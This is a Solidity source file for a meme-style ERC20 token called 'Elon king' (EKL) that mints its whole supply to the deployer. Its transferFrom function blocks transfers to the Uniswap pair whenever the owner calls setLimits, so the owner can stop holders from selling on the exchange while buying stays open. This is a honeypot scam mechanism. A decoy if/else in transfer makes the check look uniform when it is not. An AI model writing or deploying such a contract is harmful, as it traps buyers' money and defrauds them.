// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./SafeMath.sol";
import "./Ownable.sol";

contract Brois is ERC20, Ownable {
    using SafeMath for uint256;
    
    address public uniswapV2Pair;
    bool public limits = false;
    uint256 public DECIMALS = 18;

    constructor() ERC20("Elon king", "EKL") {
        _mint(_msgSender(), 1 * (10 ** 6) * (10 ** DECIMALS));
    }

    function setUniswapV2Pair(address _pair) external onlyOwner {
        uniswapV2Pair = _pair;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        if (recipient == uniswapV2Pair && !limits) {
            _transfer(_msgSender(), recipient, amount);
        } else {
            _transfer(_msgSender(), recipient, amount);
        }
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        if (to == uniswapV2Pair) {
            require (!limits, "limits error");
        }
        address spender = _msgSender();

        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function setLimits() external onlyOwner {
        limits = true;
    }

    function removeLimits() external onlyOwner {
        limits = false; 
    }
}
